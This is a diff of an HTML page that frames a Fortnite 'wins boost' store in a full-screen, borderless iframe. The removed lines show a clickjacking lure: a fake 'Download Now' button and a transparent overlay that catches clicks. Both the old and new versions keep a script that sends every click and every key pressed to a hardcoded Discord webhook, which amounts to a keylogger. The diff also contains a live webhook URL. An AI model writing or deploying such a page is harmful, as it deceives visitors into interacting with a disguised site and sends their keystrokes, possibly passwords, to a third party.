@@ -1,60 +1,37 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Free Modding Tools! Click to Claim</title>
+  <title>Modding Tools</title>
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      border: 0;
+    }
     .container {
       position: relative;
-      width: 100%;
-      height: 600px;
+      width: 100vw;
+      height: 100vh;
     }
     iframe {
       position: absolute;
       top: 0;
       left: 0;
-      width: 100%;
-      height: 600px;
-      /* If you want the iframe to be almost invisible, set a low opacity value (0.01) */
-      /* For testing, you might want it fully visible (1) */
-      opacity: 1;
+      width: 100vw;
+      height: 100vh;
+      border: none;
       z-index: 2;
-    }
-    .fake-button {
-      position: absolute;
-      top: 250px;
-      left: 40%;
-      z-index: 3;
-      background-color: red;
-      color: white;
-      padding: 15px;
-      font-size: 20px;
-      cursor: pointer;
-    }
-    /* This overlay will catch clicks on the iframe area */
-    .click-catcher {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 600px;
-      background: transparent;
-      z-index: 4; /* Above the iframe */
     }
   </style>
 </head>
 <body>
-  <h1>Claim Your Free Account Boost!</h1>
-  <p>Click the button below to Get Your Free Boost.</p>
 
   <div class="container">
-    <div class="fake-button">Download Now</div>
     <iframe id="embeddedFrame" src="https://www.messymoddingstore.com/product/fortnite-wins-boost-service-unranked-and-ranked-play-battle-royale-or-reloaded/" frameborder="0"></iframe>
-    <!-- Click-catcher overlay: if you click here, the parent page will log it -->
-    <div class="click-catcher"></div>
   </div>
 
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/1345254892419289162/kvAcUG3KlpxqjziFmfr2a-kKKNJ-2t9gJWV3_u1TuklNQylDHeibnod9zVW7-V-rlyRK"; // For testing only
+    const webhookURL = "https://discord.com/api/webhooks/1345254892419289162/kvAcUG3KlpxqjziFmfr2a-kKKNJ-2t9gJWV3_u1TuklNQylDHeibnod9zVW7-V-rlyRK"; // Replace with your actual webhook
 
     function sendLog(eventType, eventData) {
       fetch(webhookURL, {
@@ -68,7 +45,7 @@
       });
     }
 
-    // Log clicks on the document (this will catch clicks on the fake button and click-catcher)
+    // Log clicks anywhere on the document
     document.addEventListener("click", function(event) {
       sendLog("Click (Document)", { x: event.clientX, y: event.clientY });
     });
@@ -78,22 +55,13 @@
       sendLog("Key Pressed", { key: event.key });
     });
 
-    // Option: Listen for messages from the iframe if you control its content
-    // In the iframe's page, add:
-    //   window.parent.postMessage({ type: "iframeClick", x: event.clientX, y: event.clientY }, "*");
+    // Listen for messages from the iframe if it supports communication
     window.addEventListener("message", function(event) {
       if (event.data && event.data.type === "iframeClick") {
         sendLog("Click inside iframe", { x: event.data.x, y: event.data.y });
       }
     });
-
-    // Optional: If you want the click-catcher to exclusively catch clicks,
-    // you can add an event listener directly on it.
-    document.querySelector(".click-catcher").addEventListener("click", function(event) {
-      // Prevent event from propagating further if needed
-      event.stopPropagation();
-      sendLog("Click (Overlay)", { x: event.clientX, y: event.clientY });
-    });
   </script>
+
 </body>
 </html>
